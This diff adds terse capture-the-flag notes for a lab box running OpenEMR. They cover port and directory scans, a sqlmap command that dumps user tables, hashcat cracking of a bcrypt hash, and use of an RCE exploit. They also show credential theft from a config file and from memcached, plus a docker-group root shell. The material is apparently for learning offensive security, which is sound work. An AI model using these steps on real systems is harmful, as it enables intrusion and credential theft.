@@ -1,0 +1,128 @@
+---NMAP---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Cache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---MASSCAN---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.188
+Discovered open port 22/tcp on 10.10.10.188 
+
+---GOBUSTER---
+/ (common.txt):
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /.hta.txt (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /index.html (Status: 200)
+  /javascript (Status: 301)
+  /jquery (Status: 301)
+  /server-status (Status: 403)
+
+/ (big.txt):
+  /.htaccess (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /javascript (Status: 301)
+  /jquery (Status: 301)
+  /server-status (Status: 403)
+
+- (hms.htb)
+
+---/login.html---
+found a file with the login/pass verification on client side:
+ash/H@v3_fun
+every ssh username is a valid one
+using a tip from the forum to look at the /author page
+found a different host: hms.htb
+another login page found
+the copyright is from 2018 so: 5.0.1 (released 4/23/2018)
+source-code redir for /main
+patient login page found /portal
+documents explaining multiple vulns on openEMR (https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf)
+unable to combine portal auth bypass with authenticated RCE
+using sqlmap on known sqli urls
+  (possible DBMS: 'MySQL')
+  available databases [2]:
+  [*] information_schema
+  [*] openemr
+  *sqlmap -r sqlin_header.txt -D openemr -T users_facility --dump -C id,username,password
+  bunch of tables found, trying for users_*
+    users:
+      +----+-----------------+--------------+
+      | id | username        | password     |
+      +----+-----------------+--------------+
+      | 1  | openemr_admin   | NoLongerUsed |
+      | 2  | phimail-service | NoLogin      |
+      | 3  | portal-user     | NoLogin      |
+      +----+-----------------+--------------+
+    users_facility (nothing)
+    users_secure:
+      +----+---------------+--------------------------------------------------------------+
+      | id | username      | password                                                     |
+      +----+---------------+--------------------------------------------------------------+
+      | 1  | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |
+      +----+---------------+--------------------------------------------------------------+
+using hashcat to decrypt
+hashcat to identify:
+  MODE: 3200
+  TYPE: bcrypt $2*$, Blowfish (Unix)
+$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
+openemr_admin/xxxxxx
+login successful into /interfaces
+using the aRCE exploit
+done!
+
+---PRIVESC---
+login into ash with previouly found creds
+cat /home/ash/user.txt
+*./linpeas.sh:
+  Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
+
+in /var/www/hms.htb/public_html/sites/default/sqlconf.php:
+  $host	= 'localhost';
+  $port	= '3306';
+  $login	= 'openemr';
+  $pass	= '3open6emr9';
+  $dbase	= 'openemr';
+
+cron jobs are running
+  sh /etc/files/mem_script
+  /bin/sh -c sh /etc/files/mem_script
+  /bin/sh -c cp /usr/sbin/ori_runc /usr/sbin/runc
+  telnet 127.0.0.1 11211
+
+found process:
+  memcache   954  0.0  0.1 425792  4184 ?        Ssl  15:27   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pi
+  https://memcached.org/
+
+using telnet and memcached-tools:
+  *lru_crawler metadump all
+    key=account exp=-1 la=1601394961 cas=141 fetch=no cls=1 size=75
+    key=file exp=-1 la=1601394961 cas=142 fetch=no cls=1 size=70
+    key=passwd exp=-1 la=1601394962 cas=143 fetch=no cls=1 size=74
+    key=user exp=-1 la=1601394962 cas=144 fetch=no cls=1 size=68
+  *get user
+    luffy
+  *get passwd
+    0n3_p1ec3
+done!
+user luffy is on docker group
+using gtfobins to run a shell through docker
+done!
+cat /root/root.txt
